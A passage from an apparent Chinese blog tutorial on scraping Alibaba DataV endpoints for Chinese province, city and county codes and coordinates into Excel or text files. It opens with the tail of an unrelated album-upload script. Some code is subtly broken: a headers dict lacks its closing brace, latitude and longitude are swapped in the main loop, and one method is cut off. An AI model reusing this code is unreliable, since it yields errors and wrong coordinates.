&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;r2 = self.session.post (move_url, data=json.dumps (move_data),
headers=get_headers (self.session_id)) 108 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if 200 ==
r2.status_code:109 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
&nbsp;my_logs.info (f"移动成功，图片名称：{files}") 110 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;else:111
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
&nbsp;my_logs.warning (f"移动失败，图片名称：{files}，返回信息：{r2.content.decode ('utf-8')}") 112​113
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;else:114 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
&nbsp;my_logs.warning (f"上传失败，相册名称：{album}，图片名称：{files}") 115​116
&nbsp; &nbsp;def get_all_albums (self):117 &nbsp; &nbsp; &nbsp; &nbsp;__max_num = 500118 &nbsp; &nbsp; &nbsp; &nbsp;url =
f"http://{host}:{port}/api/v1/albums?count={__max_num}&amp;offset=0&amp;q=&amp;category=&amp;type=album&amp;order=name"119
&nbsp; &nbsp; &nbsp; &nbsp;r = self.session.get (url=url,
headers=get_headers (self.session_id)) 120 &nbsp; &nbsp; &nbsp; &nbsp;if 200 ==
r.status_code:121 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;content =
json.loads (r.content.decode ('utf-8')) 122 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;for c in content:123
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;self.album_info [c ["Title"]] = c ['UID'] 124​125​126if
<strong>name</strong> == '<strong>main</strong>':127 &nbsp; &nbsp;imp_num =
0128​129 &nbsp; &nbsp;users = UserLogin ('admin', '123456') 130 &nbsp;
&nbsp;users.login_action () 131 &nbsp; &nbsp;local_album_list = os.listdir (root_path) 132
&nbsp; &nbsp;for album in local_album_list:133 &nbsp; &nbsp; &nbsp; &nbsp;#
先获取当前的相册列表，如果没有则创建，否则跳过 134 &nbsp; &nbsp; &nbsp;
&nbsp;users.get_all_albums () 135 &nbsp; &nbsp; &nbsp; &nbsp;flist =
os.listdir (os.path.join (root_path, album)) 136 &nbsp; &nbsp; &nbsp;
&nbsp;users.upload_file (album_name=album, file_list=flist) 137 &nbsp; &nbsp; &nbsp; &nbsp;imp_num
+= len (flist) 138​139 &nbsp;
&nbsp;my_logs.info (f"已完成导入，共：{imp_num} 张！") 140​python</p>
<h2 id="场景效果">1.1. 场景效果</h2>
<p>  基于阿里云提供的三个省市区信息接口，依次提取其中的关键信息，将全国各区县的经纬度信息保存至 Excel 表格中。</p>
<h2 id="场景流程">1.2. 场景流程</h2>
<pre class="mermaid">graph TD
A(Start)--&gt;B[获取全国省级信息] --&gt; C[以省级编码作为入参,获取省内市级信息] --&gt; D[以市级编码作为入参,获取市内区县信息] --&gt; E[解析整理获取到的数据,写入Excel表格] --&gt; Z(END)</pre>
<hr>
<h1 id="工具与环境">2. 工具与环境</h1>
<table>
<colgroup>
<col style="width: 7%">
<col style="width: 23%">
<col style="width: 69%">
</colgroup>
<thead>
<tr class="header">
<th>序号</th>
<th>名称</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 1</td>
<td>Pycharm</td>
<td>IDE，调试编写 Python 脚本</td>
</tr>
<tr class="even">
<td> 2</td>
<td>JSON 在线格式化工具</td>
<td>工具地址：<a href="https://www.bejson.com/">https://www.bejson.com/</a></td>
</tr>
</tbody>
</table>
<hr>
<h1 id="接口地址分析">3. 接口地址分析</h1>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">获取省级信息接口</span><br><span class="line">http://datavmap-public.oss-cn-hangzhou.aliyuncs.com/areas/csv/100000_province.json</span><br><span class="line"></span><br><span class="line">获取市级信息接口，以重庆市为例</span><br><span class="line">http://datavmap-public.oss-cn-hangzhou.aliyuncs.com/areas/csv/500000_city.json</span><br><span class="line"></span><br><span class="line">获取区县信息接口，以重庆市辖区为例</span><br><span class="line">http://datavmap-public.oss-cn-hangzhou.aliyuncs.com/areas/csv/500100_district.json</span><br></pre></td></tr></tbody></table></figure>
<p>  首先，综合对比三个接口的 URL 地址发现，在编号之前的部分，都是相同的，所以可以在代码中定义一个常量：<code>base_url</code>，之后所有的接口请求 URL 地址，都可以基于这个常量进行拼接。
  接着分析省级信息接口，由于获取省级信息的接口只有这一个，且编号只能为 100000 不可更改，所以省级信息的接口地址相当于也是固定的，在方法实现中，无需定义入参。
  然后观察获取市级信息接口地址，后面的 500000 是重庆市的编码，city 是表示获取城市信息，所以在获取不同城市信息的时候，只要把接口地址中的数字替换成对应的城市编码即可。
  最后，获取区县信息接口地址也同上，500100 是重庆市辖区编码，district 表示获取区县信息，获取其他区县信息的时候，只要把数字替换成区县编码即可。</p>
<hr>
<h1 id="代码实现">4. 代码实现</h1>
<h2 id="解析json信息功能">4.1. 解析 json 信息功能</h2>
<p>  以上接口返回的内容示例如下。 </p><figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">	<span class="attr">"rows"</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">{</span></span><br><span class="line">		<span class="attr">"adcode"</span><span class="punctuation">:</span> <span class="string">"440000"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"people_count_2010"</span><span class="punctuation">:</span> <span class="number">107131199</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lat"</span><span class="punctuation">:</span> <span class="number">23.125178</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lng"</span><span class="punctuation">:</span> <span class="number">113.280637</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"广东省"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"level"</span><span class="punctuation">:</span> <span class="string">"province"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"parent"</span><span class="punctuation">:</span> <span class="string">"中华人民共和国"</span></span><br><span class="line">	<span class="punctuation">}</span><span class="punctuation">,</span> <span class="punctuation">{</span></span><br><span class="line">		<span class="attr">"adcode"</span><span class="punctuation">:</span> <span class="string">"430000"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"people_count_2010"</span><span class="punctuation">:</span> <span class="number">67158313</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lat"</span><span class="punctuation">:</span> <span class="number">28.19409</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lng"</span><span class="punctuation">:</span> <span class="number">112.982279</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"湖南省"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"level"</span><span class="punctuation">:</span> <span class="string">"province"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"parent"</span><span class="punctuation">:</span> <span class="string">"中华人民共和国"</span></span><br><span class="line">	<span class="punctuation">}</span><span class="punctuation">,</span> <span class="punctuation">{</span></span><br><span class="line">		<span class="attr">"adcode"</span><span class="punctuation">:</span> <span class="string">"130000"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"people_count_2010"</span><span class="punctuation">:</span> <span class="number">106816280</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lat"</span><span class="punctuation">:</span> <span class="number">38.045474</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lng"</span><span class="punctuation">:</span> <span class="number">114.502461</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"河北省"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"level"</span><span class="punctuation">:</span> <span class="string">"province"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"parent"</span><span class="punctuation">:</span> <span class="string">"中华人民共和国"</span></span><br><span class="line">	<span class="punctuation">}</span></span><br><span class="line">		<span class="comment">/*** 部分省略 ***/</span></span><br><span class="line">	<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">"total"</span><span class="punctuation">:</span> <span class="number">34</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">	<span class="attr">"rows"</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">{</span></span><br><span class="line">		<span class="attr">"adcode"</span><span class="punctuation">:</span> <span class="string">"430600"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"people_count_2010"</span><span class="punctuation">:</span> <span class="number">6136430</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lat"</span><span class="punctuation">:</span> <span class="number">29.37029</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lng"</span><span class="punctuation">:</span> <span class="number">113.132855</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"岳阳市"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"level"</span><span class="punctuation">:</span> <span class="string">"city"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"parent"</span><span class="punctuation">:</span> <span class="string">"湖南省"</span></span><br><span class="line">	<span class="punctuation">}</span><span class="punctuation">,</span> <span class="punctuation">{</span></span><br><span class="line">		<span class="attr">"adcode"</span><span class="punctuation">:</span> <span class="string">"430400"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"people_count_2010"</span><span class="punctuation">:</span> <span class="number">7193113</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lat"</span><span class="punctuation">:</span> <span class="number">26.900358</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lng"</span><span class="punctuation">:</span> <span class="number">112.607693</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"衡阳市"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"level"</span><span class="punctuation">:</span> <span class="string">"city"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"parent"</span><span class="punctuation">:</span> <span class="string">"湖南省"</span></span><br><span class="line">	<span class="punctuation">}</span><span class="punctuation">,</span> <span class="punctuation">{</span></span><br><span class="line">		<span class="attr">"adcode"</span><span class="punctuation">:</span> <span class="string">"430100"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"people_count_2010"</span><span class="punctuation">:</span> <span class="number">7095345</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lat"</span><span class="punctuation">:</span> <span class="number">28.19409</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lng"</span><span class="punctuation">:</span> <span class="number">112.982279</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"长沙市"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"level"</span><span class="punctuation">:</span> <span class="string">"city"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"parent"</span><span class="punctuation">:</span> <span class="string">"湖南省"</span></span><br><span class="line">	<span class="punctuation">}</span></span><br><span class="line">		<span class="comment">/*** 部分省略 ***/</span></span><br><span class="line">	<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">"total"</span><span class="punctuation">:</span> <span class="number">14</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">	<span class="attr">"rows"</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">{</span></span><br><span class="line">		<span class="attr">"adcode"</span><span class="punctuation">:</span> <span class="string">"500116"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"people_count_2010"</span><span class="punctuation">:</span> <span class="number">1200000</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lat"</span><span class="punctuation">:</span> <span class="number">29.283387</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lng"</span><span class="punctuation">:</span> <span class="number">106.253156</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"江津区"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"level"</span><span class="punctuation">:</span> <span class="string">"district"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"parent"</span><span class="punctuation">:</span> <span class="string">"重庆市市辖区"</span></span><br><span class="line">	<span class="punctuation">}</span><span class="punctuation">,</span> <span class="punctuation">{</span></span><br><span class="line">		<span class="attr">"adcode"</span><span class="punctuation">:</span> <span class="string">"500228"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"people_count_2010"</span><span class="punctuation">:</span> <span class="number">687525</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lat"</span><span class="punctuation">:</span> <span class="number">30.672168</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lng"</span><span class="punctuation">:</span> <span class="number">107.800034</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"梁平县"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"level"</span><span class="punctuation">:</span> <span class="string">"district"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"parent"</span><span class="punctuation">:</span> <span class="string">"重庆市市辖区"</span></span><br><span class="line">	<span class="punctuation">}</span><span class="punctuation">,</span> <span class="punctuation">{</span></span><br><span class="line">		<span class="attr">"adcode"</span><span class="punctuation">:</span> <span class="string">"500240"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"people_count_2010"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lat"</span><span class="punctuation">:</span> <span class="number">29.99853</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"lng"</span><span class="punctuation">:</span> <span class="number">108.112448</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"石柱土家族自治县"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"level"</span><span class="punctuation">:</span> <span class="string">"district"</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">"parent"</span><span class="punctuation">:</span> <span class="string">"重庆市市辖区"</span></span><br><span class="line">	<span class="punctuation">}</span></span><br><span class="line">		<span class="comment">/*** 部分省略 ***/</span></span><br><span class="line">	<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">"total"</span><span class="punctuation">:</span> <span class="number">38</span></span><br><span class="line"><span class="punctuation">}</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>  通过对比分析，发现上述三条接口，返回的都是 json 字符串，并且其结构是一样的，不同的只有其中的值而已。所以，只需实现一个方法，就可解析以上三类接口的返回信息。
  解析 JSON 字符串的代码如下。
  由于主要数据都存储在 key 为 <code>rows</code> 的 value 中，所以 <code>parse_json</code> 方法在传入参数之后，通过 <code>dict[key]</code> 方法，获取 <code>rows</code> 内的所有 values 数据，再使用 <code>for</code> 循环遍历 values，提取其中的关键信息，最后以元组的形式存入 <code>info</code> 列表中。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_json</span>(<span class="params">json_data</span>):</span><br><span class="line">    info = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> json_data[<span class="string">'rows'</span>]:</span><br><span class="line">        name = row[<span class="string">'name'</span>]</span><br><span class="line">        adcode = row[<span class="string">'adcode'</span>]</span><br><span class="line">        lat = row[<span class="string">'lat'</span>]</span><br><span class="line">        lng = row[<span class="string">'lng'</span>]</span><br><span class="line">        level = row[<span class="string">'level'</span>]</span><br><span class="line">        info.append((name, adcode, lat, lng, level))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="获取请求头信息">4.2. 获取请求头信息</h2>
<p>  为了模拟更加真实的不同浏览器访问，可以使每一个请求携带的 header 都不同，而模拟不同浏览器的关键因素，在 header 信息中的 <code>user-agent</code> 部分。所以，可导入 my_fake_useragent 模块，随机生成一个 agent，填入 header 字典中即可。
</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> my_fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_headers</span>():</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,"</span></span><br><span class="line">                  <span class="string">"application/signed-exchange;v=b3;q=0.9"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>,</span><br><span class="line">        <span class="string">"Host"</span>: <span class="string">"datavmap-public.oss-cn-hangzhou.aliyuncs.com"</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: ua.random()    <span class="comment"># 随机生成agent</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> headers</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="获取省市区信息功能">4.3. 获取省市区信息功能</h2>
<p>  基于面向对象的思想，对全国省市区经纬度信息定义成为一个类，其属性包含：省级信息、市级信息、区县级信息以及获取这些信息的接口 URL 地址。
  在类中，定义了三个方法 get_province、get_city、get_district，通过不同的省市区编码，利用 requests 模块，发送 get 请求，分别获取省级、市级、区县级的信息。方法实现比较简单，且大同小异，不做赘述。如有提高程序鲁棒性的需要，可加入 <code>try...except...</code> 方法，对捕获到的异常进行相应处理。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GetDistrictGPS</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.province_info = []</span><br><span class="line">        <span class="variable language_">self</span>.city_info = []</span><br><span class="line">        <span class="variable language_">self</span>.district_info = []</span><br><span class="line">        <span class="variable language_">self</span>.base_url = <span class="string">'http://datavmap-public.oss-cn-hangzhou.aliyuncs.com/areas/csv/'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_province</span>(<span class="params">self</span>):</span><br><span class="line">        province_url = <span class="string">f"<span class="subst">{self.base_url}</span>100000_province.json"</span></span><br><span class="line">        rsp = requests.get(province_url, headers=get_headers(), verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">200</span> == rsp.status_code:</span><br><span class="line">            <span class="variable language_">self</span>.province_info = parse_json(rsp.json())</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"省级信息解析完成。"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f'省级信息获取失败,状态码：<span class="subst">{rsp.status_code}</span>，请求地址：<span class="subst">{province_url}</span>'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_city</span>(<span class="params">self, code</span>):</span><br><span class="line">        city_url = <span class="string">f"<span class="subst">{self.base_url}</span><span class="subst">{code}</span>_city.json"</span></span><br><span class="line">        data = requests.get(city_url, headers=get_headers(), verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">200</span> == data.status_code:</span><br><span class="line">            <span class="variable language_">self</span>.city_info = parse_json(data.json())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f'<span class="subst">{code}</span>市级经纬度获取失败,状态码：<span class="subst">{data.status_code}</span>，请求地址：<span class="subst">{city_url}</span>'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_district</span>(<span class="params">self, code</span>):</span><br><span class="line">        dist_url = <span class="string">f"<span class="subst">{self.base_url}</span><span class="subst">{code}</span>_district.json"</span></span><br><span class="line">        data = requests.get(dist_url, headers=get_headers(), verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">200</span> == data.status_code:</span><br><span class="line">            <span class="variable language_">self</span>.district_info = parse_json(data.json())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(data.status_code, <span class="string">f'<span class="subst">{code}</span>区县经纬度获取失败'</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="数据写入表格功能">4.4. 数据写入表格功能</h2>
<p>  可参考：<a href="/p/6e3b1b9.html" target="_blank">《【Python】基于 xlwt/xlrd 和 openpyxl 库分别实现对 Excel 表格的读写功能》</a>博客，修改后的代码如下。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="string">"""=================================================</span></span><br><span class="line"><span class="string">@Author ：FantasyBoyce</span></span><br><span class="line"><span class="string">@Date   ：2021/2/6 22:11</span></span><br><span class="line"><span class="string">@Desc   ：</span></span><br><span class="line"><span class="string">=================================================="""</span></span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> xlutils.copy <span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExcelHandle</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 初始化保存的路径和文件名，此处以当前时间命名，如有其他需求，可自行更改</span></span><br><span class="line">        filename = <span class="string">'{}.xlsx'</span>.<span class="built_in">format</span>(time.strftime(<span class="string">'%Y%m%d%H%M%S'</span>))</span><br><span class="line">        <span class="variable language_">self</span>.path = os.path.join(os.getcwd(), filename)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 初始化表格的表头字段</span></span><br><span class="line">        <span class="variable language_">self</span>.__init_title = [<span class="string">'省名'</span>, <span class="string">'省级编码'</span>, <span class="string">'市名'</span>, <span class="string">'市级编码'</span>, <span class="string">'区县名称'</span>, <span class="string">'区县编码'</span>, <span class="string">'经度'</span>, <span class="string">'纬度'</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.__init_templates()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init_templates</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 初始化文件，生成一个仅含有表头的表格</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(<span class="variable language_">self</span>.path):</span><br><span class="line">                <span class="comment"># 如果文件已存在，那么先删除</span></span><br><span class="line">                os.remove(<span class="variable language_">self</span>.path)</span><br><span class="line">                <span class="variable language_">self</span>.__init_templates()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 新建一个工作表对象</span></span><br><span class="line">                workbook = xlwt.Workbook(<span class="variable language_">self</span>.path)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 创建sheet页</span></span><br><span class="line">                sheet = workbook.add_sheet(<span class="string">'全国区县经纬度信息'</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 循环之前定义的表头，从第1行第1列开始，依次写入数据</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="variable language_">self</span>.__init_title)):</span><br><span class="line">                    sheet.write(<span class="number">0</span>, i, <span class="variable language_">self</span>.__init_title[i])</span><br><span class="line">                </span><br><span class="line">                workbook.save(<span class="variable language_">self</span>.path)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write_content</span>(<span class="params">self, content</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 打开表格</span></span><br><span class="line">            workbook = xlrd.open_workbook(<span class="variable language_">self</span>.path)</span><br><span class="line">            <span class="comment"># 获取表格中所有的sheets页，列表类型</span></span><br><span class="line">            sheets_list = workbook.sheet_names()</span><br><span class="line">            </span><br></pre></td></tr></tbody></table></figure>
<h2 id="主函数入口">4.5. 主函数入口</h2>
<p>  主入口函数如下。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 实例化一个类的对象</span></span><br><span class="line">    myGPS = GetDistrictGPS()</span><br><span class="line">    myExcel = ExcelHandle()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取全国所有的省级信息，并遍历</span></span><br><span class="line">    myGPS.get_province()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> province <span class="keyword">in</span> myGPS.province_info:</span><br><span class="line">        province_name = province[<span class="number">0</span>]</span><br><span class="line">        province_code = province[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取当前省级的所有市级信息，并遍历</span></span><br><span class="line">        myGPS.get_city(province_code)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> city <span class="keyword">in</span> myGPS.city_info:</span><br><span class="line">            city_name = city[<span class="number">0</span>]</span><br><span class="line">            city_code = city[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"正在获取<span class="subst">{province_name}</span><span class="subst">{city_name}</span>信息"</span>)</span><br><span class="line">            myGPS.get_district(city_code)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 获取当前市级的所有区县级信息，并遍历</span></span><br><span class="line">            <span class="keyword">for</span> dist <span class="keyword">in</span> myGPS.district_info:</span><br><span class="line">                district_name = dist[<span class="number">0</span>]</span><br><span class="line">                district_code = dist[<span class="number">1</span>]</span><br><span class="line">                district_lng = dist[<span class="number">2</span>]</span><br><span class="line">                district_lat = dist[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 组装数据，写入Excel表格</span></span><br><span class="line">                excel_data = [province_name, province_code, city_name, city_code, district_name, district_code,</span><br><span class="line">                              district_lng, district_lat]</span><br><span class="line"></span><br><span class="line">                myExcel.write_content(excel_data)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h1 id="最终实现效果">5. 最终实现效果</h1>
<p>  控制台打印日志如下。 </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">D:\00Software\Python\python.exe D:/02Code/01PyFiles/GenerateGPS/GetDistrctGPS.py</span><br><span class="line">省级信息解析完成。</span><br><span class="line">正在获取江西省九江市信息</span><br><span class="line">正在获取江西省吉安市信息</span><br><span class="line">正在获取江西省抚州市信息</span><br><span class="line">正在获取江西省景德镇市信息</span><br><span class="line">正在获取江西省上饶市信息</span><br><span class="line">正在获取江西省新余市信息</span><br><span class="line">正在获取江西省鹰潭市信息</span><br><span class="line">正在获取江西省萍乡市信息</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>  Excel 数据写入如下所示。 <img src="https://ae01.alicdn.com/kf/U9eaf7260625c42b49a02147cf77f8fden.jpg" alt="Excel数据"></p>
<h1 id="说明">6. 说明</h1>
<p>  经过实际操作，发现获取全国所有的城市的经纬度，需要发送大约 38000 余条请求，也就意味着要对 Excel 读写 38000 余次。而参考<a href="/p/6e3b1b9.html">《【Python】基于 xlwt/xlrd 和 openpyxl 库分别实现对 Excel 表格的读写功能》</a>博客中的 xlwt 读写效率结果，想要完成这 38000 余条数据的写入，会非常的耗时。
  所以，在数据写入这一步，将由原来的<code>写入Excel表格</code>修改成<code>写入txt文件</code>，这样一来，不到一分钟，即可获取全国所有省市的经纬度信息。
  写入 txt 文件的代码十分简单，如下所示。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'./data.txt'</span>, <span class="string">'a+'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.writelines(<span class="built_in">str</span>(content) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
